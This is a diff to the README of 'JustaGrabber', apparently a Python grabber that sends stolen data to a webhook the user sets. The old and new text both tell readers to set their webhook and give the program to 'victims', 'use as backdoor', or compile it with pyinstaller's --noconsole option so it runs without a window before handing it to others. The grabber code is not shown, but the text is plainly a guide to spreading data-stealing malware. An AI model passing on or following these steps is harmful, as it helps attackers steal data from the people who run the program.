@@ -19,14 +19,15 @@
 JustaGrabber dosen't needs any other modules. 
 Just need python 3's internal module! (os, re, json, urllib.request)
  
-### 📁 How to use
+### 📁・ How to use
 1. Download python 3 at [python.org](https://python.org). Must be 3.x.x
 2. Open "JustaGrabber.py" with any code editor.
 3. Replace Your webhook in line 3
-4. send exe to your victims 😈
+4. Send the code or use as backdoor. Or convert to exe then give to others
 
-### ⚙・Compiling Source Code
-Start of by opening a cmd in your directory and type:
+### ⚙・How to compile .py to .exe
+*You must install pyinstaller typing this in cmd : * '''pip install pyinstaller'''
+Open cmd in the directory that the JustaGrabber.py is in then type : 
 ```
 pyinstaller --onefile --clean --noconsole main.py
 ```
